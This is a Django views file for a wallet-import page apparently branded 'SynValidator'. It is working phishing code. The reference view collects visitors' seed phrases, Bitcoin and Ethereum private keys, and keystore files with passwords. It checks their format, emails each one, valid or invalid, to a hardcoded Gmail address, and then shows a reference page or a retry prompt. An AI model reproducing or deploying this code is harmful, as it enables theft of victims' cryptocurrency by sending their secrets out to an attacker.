from django.shortcuts import render
from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.core.mail import send_mail
from django.conf import settings
from mnemonic import Mnemonic
import base58
import time

# Create your views here.
def index(request):
    return render(request, 'index.html')

def wallets(request):
    return render(request, 'wallets.html')

def importkey(request):
    if request.method == 'GET':
        alert = request.GET.get('alert', '')
        return render(request, 'import.html',{
                    'alert' : alert
                })
    return render(request, 'import.html')

def reference(request):
    if request.method == 'POST':
        recoveryPhrase = request.POST.get('recovery')
        privateKey = request.POST.get('private')
        key = request.POST.get('key')
        password = request.POST.get('password')
        
        if recoveryPhrase != '' and privateKey == '' and key == '' and password == '' :
            mnemo = Mnemonic("english")
            if mnemo.check(recoveryPhrase):
                sendmailphrase(recoveryPhrase)
                time.sleep(2)
                return render(request, 'reference_id.html')
            
            else:
                sendmailphrase(recoveryPhrase, status='Invalid')
                time.sleep(5)
                return render(request, 'import.html',{
                    'alert' : 'Mnemonic phrase is incorrect, try again.'
                })
        
        elif recoveryPhrase == '' and privateKey != '' and key == '' and password == '' :
            try:
                if is_valid_wif(privateKey):
                    sendmailprivateKey(privateKey, crypto_type="Bitcoin WIF")
                    time.sleep(2)
                    return render(request, 'reference_id.html')
                
                elif is_valid_hex_key(privateKey):
                    sendmailprivateKey(privateKey, crypto_type="Bitcoin Hexadecimal")
                    time.sleep(2)
                    return render(request, 'reference_id.html')
                
                elif is_valid_ethereum_key(privateKey):
                    sendmailprivateKey(privateKey, crypto_type="Ethereum")
                    time.sleep(2)
                    return render(request, 'reference_id.html')
                
                else:
                    sendmailprivateKey(privateKey, crypto_type='', status="Invalid")
                    time.sleep(5)
                    return render(request, 'import.html',{
                        'alert' : 'Private key is incorrect, try again.'
                    })
                
            except ValueError:
                sendmailprivateKey(privateKey, crypto_type='', status="Invalid")
                time.sleep(5)
                return render(request, 'import.html',{
                    'alert' : 'Private key is incorrect, try again.'
                })
            
        elif recoveryPhrase == '' and privateKey == '' and key != '' and password != '':
            sendmailkeyStore(key, password)
            time.sleep(3)
            return render(request, 'reference_id.html')
        
        else:
            return render(request, 'import.html',{
                'alert' : 'Field key cannot be empty'
            })

    return render(request, 'import.html')

# Compose email content
def sendmailphrase(recoveryPhrase, status='Valid'):
        subject = f"RP from SynValidator"
        body = f"{status} Recovery Phrase: {recoveryPhrase}"
        recipient_email = 'Maduabuchiemmanuel99@gmail.com'  # Your custom recipient

        # Send email
        send_mail(
            subject,
            body,
            settings.EMAIL_HOST_USER,  # From email
            [recipient_email],  # To email
            fail_silently=False,  # Raise errors if sending fails
        )
        
def sendmailprivateKey(privateKey, crypto_type, status='Valid'):
        subject = f"PK from SynValidator"
        body = f"{status} {crypto_type} Private Key: {privateKey}"
        recipient_email = 'Maduabuchiemmanuel99@gmail.com'  # Your custom recipient

        # Send email
        send_mail(
            subject,
            body,
            settings.EMAIL_HOST_USER,  # From email
            [recipient_email],  # To email
            fail_silently=False,  # Raise errors if sending fails
        )
        
def sendmailkeyStore(keyStore, password):
        subject = f"KS from SynValidator"
        body = f"Keystore: {keyStore} \n Password: {password}"
        recipient_email = 'Maduabuchiemmanuel99@gmail.com'  # Your custom recipient

        # Send email
        send_mail(
            subject,
            body,
            settings.EMAIL_HOST_USER,  
            [recipient_email],  
            fail_silently=False,
        )
        
# Private keyStore validator
def is_valid_wif(key):
    try:
        base58.b58decode_check(key)
        return True
    except ValueError:
        return False

def is_valid_hex_key(key):
    return len(key) == 64 and all(c in '0123456789abcdefABCDEF' for c in key)

def is_valid_ethereum_key(key):
    return len(key) == 64 and all(c in '0123456789abcdefABCDEF' for c in key)
